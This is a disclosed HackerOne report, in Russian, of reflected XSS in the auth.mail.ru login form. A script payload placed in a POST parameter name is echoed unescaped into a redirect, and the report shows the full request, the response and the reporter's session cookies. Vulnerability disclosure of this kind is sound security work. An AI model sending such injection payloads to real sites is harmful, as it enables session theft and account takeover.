---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13195'
original_report_id: '13195'
title: 'auth.mail.ru: XSS in login form'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-05-24T14:41:33.459Z'
disclosed_at: '2015-09-13T12:00:50.027Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# auth.mail.ru: XSS in login form

## Metadata

- HackerOne Report ID: 13195
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:00:50.027Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет!
XSS присутствует прямо в форме логина, достаточно указать верные креды :)
Собственно, как повторить:
Отправляем такой вот POST, свой пароль я затер, сорри. 
Но (!!) работает только если верные креды

POST /cgi-bin/auth HTTP/1.1
Host: auth.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://e.mail.ru/login?fail=1&sdc=1&page=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox
Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=dpr=2|rt=1|fver=13|s_vp=(1247/604); i=AQClp4BTAQBdAAUCAQA=; b=VT8NAHDFSAUAvhqkgVaDNCQEbYSQMIFQWjoR8hY3wmXXRggAAAgJ0BlifGojlDduhO1FBfHEmyFQaVqBQGdwE+H803CQ03KrEU47gUY4jwoaAgAA; mc1=1400941396; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAQCuwcA; Mpop=1400941847:034e7b507053635019050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; ssdc=6e871d912e484945a040ceb1e45ab4be; ssdc_info=6e87:0:1400941847
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 208

Login=isox&Domain=inbox.ru&Password=ПРАВИЛЬНЫЙ_ПАРОЛЬ&saveauth=1&new_auth_form=0&page=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox&post=test&login_from=test&"><script>alert(1)</script>=test&lang=ru_RU&setLang=ru_RU

Обратите внимание, XSS в имени доп. параметра

Вот отклик:

HTTP/1.1 200 OK
Server: nginx/1.4.4
Date: Sat, 24 May 2014 14:38:51 GMT
Content-Type: text/html; charset=windows-1251
Connection: close
P3P: CP="NON CUR OUR IND UNI INT"
X-Frame-Options: DENY
Set-Cookie: Mpop=1400942331:457c7c4571057b5119050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; expires=Fri, 22 Aug 2014 14:38:51 GMT; path=/; domain=.mail.ru
Set-Cookie: ssdc=a88bbaac8f1340578774414b45d47766; expires=Fri, 22 Aug 2014 14:38:51 GMT; path=/; domain=.auth.mail.ru; Secure; HttpOnly
Set-Cookie: ssdc_info=a88b:0:1400942331; expires=Fri, 22 Aug 2014 14:38:51 GMT; path=/; domain=.auth.mail.ru; HttpOnly
Set-Cookie: t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAQCuwcA; expires=Thu, 20 Nov 2014 14:38:51 GMT; path=/; domain=.mail.ru
Cache-Control: no-cache,no-store,must-revalidate
Pragma: no-cache
Expires: Fri, 24 May 2013 14:38:51 GMT
Last-Modified: Sat, 24 May 2014 18:38:51 GMT
Content-Length: 494

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1251">
<script language="JavaScript"><!--
    window.location.replace("https://e.mail.ru/messages/inbox?"><script>alert(1)</script>=test&post=test&login_from=test"); 
// --></script>
<meta http-equiv="refresh" content="0;url=https://e.mail.ru/messages/inbox?"><script>alert(1)</script>=test&post=test&login_from=test">
</head>
<body></body>
</html>

Как видите, экранирование не отработало :)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
